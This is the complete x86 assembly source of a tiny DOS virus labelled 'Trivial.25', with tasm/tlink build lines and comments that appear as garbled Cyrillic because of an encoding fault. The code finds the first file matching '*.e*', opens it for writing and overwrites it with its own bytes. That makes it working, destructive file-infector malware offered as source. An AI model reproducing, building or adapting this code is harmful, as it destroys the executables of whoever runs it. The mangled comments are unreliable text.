   ; Trivial.25 (c) by Duke/SMF
   ; …á«¨ ¢ â¥ªãé¥¬ ª â «®£¥ ¥áâì EXE-ä ©« (¯¥à¢ë©, ¥á«¨ ¨å ¬®£®),
   ; â® ¯¥à¥§ ¯¨è¥¬ ¥£®. * ¯¨á ® ¯® áâ®¯ ¬ ¬®¥£® ¢¨àãá  Companion.38 .
   ; tasm tr_25.asm /m
   ; tlink tr_25.obj /t

          .model tiny
          .code
          org  100h
   start:
   maska  db   '*.e*'
          mov  ah,4eh       ; ¨é¥¬
          call new
   new:
          mov  dx,si
          int  21h

          mov  ax,3D01h     ; ®âªàë¢ ¥¬
          mov  dx,9eh
          int  21h

          xchg bx,ax
          mov  ah,40h       ; ¯¨è¥¬áï
          ret

   end start
